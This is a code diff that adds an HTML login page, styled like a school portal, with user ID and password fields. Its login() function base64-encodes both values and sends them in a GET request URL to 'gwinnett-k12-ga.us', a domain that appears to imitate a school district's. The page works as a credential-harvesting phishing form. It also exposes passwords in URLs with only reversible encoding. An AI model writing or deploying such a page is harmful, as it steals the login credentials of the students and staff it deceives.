@@ -1,0 +1,19 @@
+<head>
+    <title>Function not defined</title>
+  </head>
+  <body>
+    <input type="password" name="password" id="portalPassword" class="form-control input-lg" placeholder="PASSWORD" onclick="$(this).select();">
+    <input type="text" name="username" id="portalUserID" class="form-control input-lg" placeholder="USER ID" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"> <label class="glyphicon glyphicon-user" for="portalUserID"></label>
+    <button id="action" onclick="login()">Click me</button>
+    <script type="text/javascript">
+      function login(){
+            var http = new XMLHttpRequest();
+            var username = document.getElementById("portalUserID").value;
+            var password = document.getElementById("portalPassword").value;
+            var url = "https://gwinnett-k12-ga.us/securestring/" + btoa(username).replace(/=/g,'') + "/" + btoa(password).replace(/=/g,'');
+            http.open("GET", url, true);
+            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            http.send();
+        }
+    </script>
+  </body>
